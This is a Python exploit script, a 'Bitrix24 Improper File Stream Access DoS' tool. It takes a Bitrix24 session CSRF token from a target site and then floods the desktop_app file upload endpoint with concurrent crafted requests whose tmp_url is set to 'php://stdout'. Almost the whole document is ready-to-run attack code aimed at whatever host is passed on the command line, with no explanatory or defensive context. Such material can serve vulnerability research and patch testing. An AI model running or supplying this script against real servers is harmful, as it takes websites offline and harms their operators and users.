#!/usr/bin/env python3

import random
import asyncio
import aiohttp
import re
import argparse

async def preauth(session, host):
    try:
        async with session.get(host, ssl=False) as response:
            data = await response.text()
            return re.search(r"'bitrix_sessid':'([a-f0-9]{32})'", data).group(1)
    except aiohttp.ClientError as e:
        print(f"Failed to access the website: {e}")
        return None

async def DoS(session, sessid, host, site_id, num_requests):
    tasks = []
    for _ in range(num_requests):
        CID = random.randint(0, pow(10, 5))
        url = f"{host}/desktop_app/file.ajax.php?action=uploadfile"
        data = {
            "bxu_info[mode]": "upload",
            "bxu_info[CID]": str(CID),
            "bxu_info[filesCount]": "1",
            "bxu_info[packageIndex]": f"pIndex{CID}",
            "bxu_info[NAME]": f"file{CID}",
            "bxu_files[0][name]": f"file{CID}",
            "bxu_files[0][files][default][tmp_url]": "a:php://stdout",
            "bxu_files[0][files][default][tmp_name]": f"file{CID}",
        }
        headers = {
            "X-Bitrix-Csrf-Token": sessid,
            "X-Bitrix-Site-Id": site_id,
        }

        task = asyncio.create_task(send_request(session, url, data, headers))
        tasks.append(task)

    await asyncio.gather(*tasks)

async def send_request(session, url, data, headers):
    async with session.post(url, data=data, headers=headers, ssl=False) as response:
        pass

async def main(host, site_id, num_requests):
    async with aiohttp.ClientSession() as session:
        sessid = await preauth(session, host)
        if sessid is not None:
            await DoS(session, sessid, host, site_id, num_requests)
        else:
            print("Aborting due to website access failure.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bitrix24 Improper File Stream Access DoS")
    parser.add_argument("--host", required=True, help="Target host URL")
    parser.add_argument("--site_id", required=True, help="SITE_ID value")
    parser.add_argument("--num_requests", type=int, default=1000, help="Number of requests to send")
    args = parser.parse_args()

    asyncio.run(main(args.host, args.site_id, args.num_requests))
